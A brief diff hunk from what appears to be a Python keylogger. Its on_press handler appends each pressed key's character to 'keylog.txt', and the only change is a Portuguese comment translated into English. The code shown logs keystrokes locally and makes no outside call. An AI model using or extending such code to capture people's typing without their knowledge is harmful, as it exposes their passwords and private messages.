@@ -7,7 +7,7 @@ log_file = "keylog.txt"
 
 def on_press(key):
     try:
-        with open(log_file, "a") as f: # a significa append
+        with open(log_file, "a") as f: # a means append
             f.write(f"{key.char}")
     except AttributeError:
         with open(log_file, "a") as f:
